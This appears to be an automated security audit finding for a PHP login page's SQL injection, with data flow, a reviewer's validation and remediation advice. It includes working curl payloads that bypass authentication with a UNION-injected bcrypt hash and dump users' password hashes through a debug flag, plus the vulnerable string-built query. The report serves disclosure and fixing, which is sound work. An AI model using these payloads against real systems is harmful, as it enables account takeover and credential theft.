# Vulnerability: SQL Injection — Unauthenticated login `email` parameter (auth bypass + hash disclosure)

## Summary
`user/login.php` interpolates the POST `email` field directly into a `sprintf`-built SELECT
with no escaping or parameterization (`:12-16`). An unauthenticated attacker can inject a
`UNION SELECT` row carrying an attacker-chosen bcrypt hash to satisfy `verifypw()` and
receive a valid authenticated session, and can use the `?debug=1` flag to make
`print_r($data)` (`:19-20`) disclose arbitrary query output, including other users' password
hashes.

## Confidence
High — found by both taint directions and survived all three adversarial attacks with a
fully cited path.

## Authentication Requirement
Unauthenticated.

## Attack Surface Location
- **Endpoint:** `POST /user/login.php`
- **Handler:** `user/login.php:11-16` (sink), `:19-24` (impact)
- **Framework protections bypassed:** AumWAF (`libs/AumWAF.class.php:34-45`) blocks only the
  literal substrings `sqlmap/acunetix/nessus/bot/scan/zap/parros/injector`, none of which
  occur in a `' UNION SELECT ...` payload. No `mysqli_real_escape_string`/prepared statements.

## Attack Chain
1. **Initial access:** attacker reaches `/user/login.php` unauthenticated.
2. **Endpoint interaction:** submits the login form (non-empty `email` and `password`).
3. **Malicious input:** `email=' UNION SELECT 1,'attacker','<bcrypt-hash>','x@y.z'-- -` with
   `password` matching the embedded hash; or `?debug=1` with a data-extraction payload.
4. **Sink execution:** `sprintf("SELECT * FROM tbl_users WHERE useremail = '%s'", $email)`
   then `$mysqli->query($sql)` (`:15-16`).
5. **Post-exploitation:** the injected row passes `verifypw()` (`:22`) and triggers
   `$_SESSION = $data; $_SESSION['auth']=true; setcookie("user_auth", ...)` (`:23-30`),
   then `redirect('index.php')`. With `?debug=1`, `print_r($data)` leaks the row.
6. **Final impact:** authentication bypass and disclosure of `tbl_users` password hashes.

## Data Flow
- **Source (user input):** HTTP POST body `email` (`user/login.php:12`).
- **Sink:** `mysqli::query` (`user/login.php:16`).

```
post('email') → $email [user/login.php:12]
  → sprintf("... useremail = '%s'", $email) [user/login.php:15]
  → $mysqli->query($sql) [user/login.php:16]
  → verifypw()/$_SESSION=$data [user/login.php:22-24]
```

## Proof of Concept

### Prerequisites
- A bcrypt hash of a chosen plaintext (e.g. generated offline). No account required.

### Exploit Request
```bash
# Authentication bypass: injected row supplies a hash of the chosen password "pwn"
curl -s -i -X POST 'http://{{TARGET_HOST}}/user/login.php' \
  --data-urlencode "email=' UNION SELECT 1,'attacker','\$2y\$10\$REPLACE_WITH_BCRYPT_OF_pwn','x@y.z'-- -" \
  --data-urlencode 'password=pwn'

# Data disclosure: ?debug=1 reflects the query row (password hashes)
curl -s -X POST 'http://{{TARGET_HOST}}/user/login.php?debug=1' \
  --data-urlencode "email=' UNION SELECT id,username,userpass,useremail FROM tbl_users-- -" \
  --data-urlencode 'password=x'
```

### Expected Vulnerable Response
```http
HTTP/1.1 302 Found
Set-Cookie: user_auth=1; user_id=1; ...
Location: index.php
```
or, with `?debug=1`, a `print_r` dump containing `[userpass] => $2y$10$...`.

### Expected Patched Response
`$q->num_rows == 0` → `"User Email doesn't exists."`; no session is created and no query row
is reflected.

### Impact Demonstration
The attacker authenticates without valid credentials and/or dumps every `tbl_users`
password hash (bcrypt → offline cracking → account takeover).

## Affected Code
```php
// user/login.php:12-16
$email = post('email');
$password = post('password');

$sql = sprintf("SELECT * FROM tbl_users WHERE useremail = '%s'", $email);
$q = $mysqli->query($sql);
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** `user/login.php:12` reads raw `post('email')`;
  the endpoint is public; the concatenated query runs at `:16`; the WAF signature list
  (`libs/AumWAF.class.php:34-45`) does not match the payload.
- **Impact attack — FAILED to kill.** `verifypw()` (`:22`) + `$_SESSION=$data; auth=true`
  (`:23-24`) give a real session; `print_r($data)` (`:19-20`) discloses hashes. In scope.
- **Validity attack — FAILED to kill.** No escaping, no prepared statement, no type/enum
  constraint on `email`.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
Use prepared statements with bound parameters for authentication queries. Remove the
`print_r($data)` debug dump and never base authentication decisions on the raw output of a
concatenated query.
